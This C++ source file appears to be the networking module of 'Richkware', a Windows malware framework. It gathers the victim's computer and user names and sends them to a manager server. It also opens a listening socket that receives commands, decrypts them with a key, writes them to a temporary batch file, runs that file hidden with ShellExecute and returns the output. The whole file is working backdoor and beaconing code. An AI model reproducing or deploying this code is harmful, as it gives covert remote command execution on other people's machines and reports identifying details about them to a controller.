/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/

#include "network.h"

Server::Server(const char* encryptionKeyArg) {
	encryptionKey = encryptionKeyArg;
	hThread = NULL;
	//condWhile = true;
}

Server& Server::operator=(const Server& server) {
	encryptionKey = server.encryptionKey;
	hThread = server.hThread;
	//condWhile = server.condWhile;
	return *this;
}

Network& Network::operator=(const Network& network) {
	encryptionKey = network.encryptionKey;
	server = network.server;
	return *this;
}

Network::Network(const char* encryptionKeyArg) {
	encryptionKey = encryptionKeyArg;
	server = Server(encryptionKeyArg);
}

const char* Network::RawRequest(const char* serverAddress, const char* port,	const char* request) {
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	const char* sendbuf = request;
	const int bufferlength = 512;
	char recvbuf[bufferlength];
	int iResult;
	std::string response;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		return "Error";
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(serverAddress, port, &hints, &result);
	if (iResult != 0) {
		WSACleanup();
		return "Error";
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			WSACleanup();
			return "Error";
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET) {
		WSACleanup();
		return "Error";
	}

	// Send an initial buffer
	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return "Error";
	}

	// Receive until the peer closes the connection
	do {

		iResult = recv(ConnectSocket, recvbuf, bufferlength, 0);
		if (iResult > 0) {
			// answer
			response.append(recvbuf);

		}
		else if (iResult == 0) {
			// connection closed
		}
		else {
			// error
		}

	} while (iResult > 0);

	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return "Error";
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return response.c_str();
}


bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, const char* port) {
	TCHAR  infoBuf[8000];
	DWORD  bufCharCount = 8000;
	std::string computerName;
	if (!GetComputerName(infoBuf, &bufCharCount))
		computerName = infoBuf;
	std::string userName;
	if (!GetUserName(infoBuf, &bufCharCount))
		userName = infoBuf;

	Device device = Device(computerName + "/" + userName, "none");

	std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
	//deviceStr = EncryptDecrypt(deviceStr,"5");

	RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" +deviceStr +" \r\nHost: " + serverAddress + "\r\nConnection: close\r\n\r\n").c_str());
	
	return true;
}


void Server::Start(const char* port, bool encrypted) {
	DWORD dwThreadId;
	ServerThreadArgs sta;
	
	if (encrypted)
		sta.encryptionKey = encryptionKey;
	else
		sta.encryptionKey = NULL;

	WSADATA wsaData;
	int iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	
	struct addrinfo *result = NULL;
	struct addrinfo hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		//throw 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, port, &hints, &result);
	if (iResult != 0) {
		WSACleanup();
		//throw 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype,
		result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		freeaddrinfo(result);
		WSACleanup();
		//throw 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		//throw 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		closesocket(ListenSocket);
		WSACleanup();
		//throw 1;
	}

	sta.ListenSocket = ListenSocket;

	hThread = CreateThread(0, 0, &ServerThread,
		(void*)&sta, 0, &dwThreadId);

}

void Server::Stop() {
	//condWhile = false;
	SuspendThread(hThread);
}

HANDLE Server::getHhread() {
	return hThread;
}

DWORD WINAPI ServerThread(void* arg) {
	const char* encryptionKey = (const char*)((*((ServerThreadArgs*)arg)).encryptionKey);
	//SharedBool cond = (SharedBool)((*((ServerThreadArgs*)arg)).condWhile);
	SOCKET ListenSocket = (SOCKET)((*((ServerThreadArgs*)arg)).ListenSocket);
	
	//HANDLE hClientThreadArray[1000];
	SOCKET ClientSocket = INVALID_SOCKET;
	// multi-thread
	int i = 0;
	while (true){//cond.getValue()) {
		// Accept a client socket
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			closesocket(ListenSocket);
			WSACleanup();
			//throw 1;
		} else {
			ClientSocketThreadArgs csa;
			csa.ClientSocket = ClientSocket;
			csa.encryptionKey = encryptionKey;

			//hClientThreadArray[i] = 
			CreateThread(0, 0, &ClientSocketThread,(void*)&csa, 0, NULL);
			++i;
		}
	}
	//mainthread waits until all threads have termined
	//WaitForMultipleObjects(MAX_THREAD, hClientThreadArray, TRUE, INFINITE);
	
	/*for (int j = 0; j<1000 ; ++j) {
		if (hClientThreadArray[j] != NULL)
			CloseHandle(hClientThreadArray[j]);
	}*/

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();

	return 0;
}


DWORD WINAPI ClientSocketThread(void* arg) {
	const int bufferlength = 512;
	SOCKET ClientSocket = (SOCKET)((*((ClientSocketThreadArgs*)arg)).ClientSocket);
	const char* encryptionKey = (const char*)((*((ClientSocketThreadArgs*)arg)).encryptionKey);
	int iResult;

	std::string command;
	int iSendResult;
	char recvbuf[bufferlength];
	int recvbuflen = bufferlength;
	std::size_t posSubStr;
	// write the output of command in a file
	srand((unsigned int)time(0));
	std::stringstream ss;
	ss << rand(); // An integer value between 0 and RAND_MAX

	std::string fileName = ss.str();
	char tmp_path[MAX_PATH];
	GetTempPath(MAX_PATH, tmp_path);
	std::string fileBat = tmp_path;
	fileBat.append(fileName + ".bat");
	std::string fileLog = tmp_path;
	fileLog.append(fileName + ".log");
	// Receive until the peer shuts down the connection

	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		command.append(recvbuf);

		// string decryption
		if (encryptionKey != NULL) command = EncryptDecrypt(command, encryptionKey);

		posSubStr = command.find("---");
		if (posSubStr != std::string::npos) {

			// erase escape characters
			command.erase(posSubStr);

			std::string commandTmp = command;
			commandTmp.append(" > " + fileLog);
			std::ofstream file(fileBat.c_str());

			if (file.is_open()) {
				for (std::string::iterator it = commandTmp.begin();
					it != commandTmp.end(); ++it) {
					file << *it;
				}
				file.close();
			}

			if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
				// Response
				command.append("  -->  ");
				std::ifstream fileResp(fileLog.c_str());
				std::string s;
				if (fileResp.is_open()) {
					while (!fileResp.eof()) {
						getline(fileResp, s);
						command.push_back('\n');
						command.append(s);
					}
				}

				// string encryption
				if (encryptionKey != NULL) command = EncryptDecrypt(command, encryptionKey);

				iSendResult = send(ClientSocket, command.c_str(),
					(int)strlen(command.c_str()), 0);
				fileResp.close();

			}
			else {
				iSendResult = send(ClientSocket, "error", 5, 0);
			}
			if (iSendResult == SOCKET_ERROR) {
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
		}
		command = "";
		command.clear();

	} while (iResult > 0);

	// remove tmp files
	remove(fileBat.c_str());
	remove(fileLog.c_str());

	// shutdown the connection
	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}
	return 0;
}

Device::Device(std::string nameArg, std::string serverPortArg) {
	name = nameArg;
	serverPort = serverPortArg;
}

Device& Device::operator=(const Device& device) {
	name = device.name;
	serverPort = device.serverPort;
	return *this;
}

std::string Device::getName() {
	return name;
}

std::string Device::getServerPort() {
	return serverPort;
}

void Device::setName(std::string nameArg) {
	name = nameArg;
}

void Device::setServerPort(std::string serverPortArg) {
	serverPort = serverPortArg;
}
